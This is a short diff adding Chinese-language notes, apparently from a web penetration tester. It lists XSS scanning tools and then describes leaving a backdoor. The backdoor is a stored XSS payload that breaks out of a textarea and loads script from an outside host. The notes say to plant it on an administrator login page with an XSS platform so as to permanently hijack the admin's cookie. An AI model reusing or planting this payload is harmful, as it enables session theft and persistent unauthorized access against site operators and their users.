@@ -1,0 +1,16 @@
+xss漏洞扫描
+wvs
+椰树
+safe3
+Xelenium
+w3af
+vega
+xss扫描插件+bp
+
+
+留后门
+加到管理员登录页面（配合platform平台）
+</textarea>' "><script src=http://xxx.cn/wdfw?2334></script>
+
+写入管理员登陆页面
+永久劫持管理员cookie
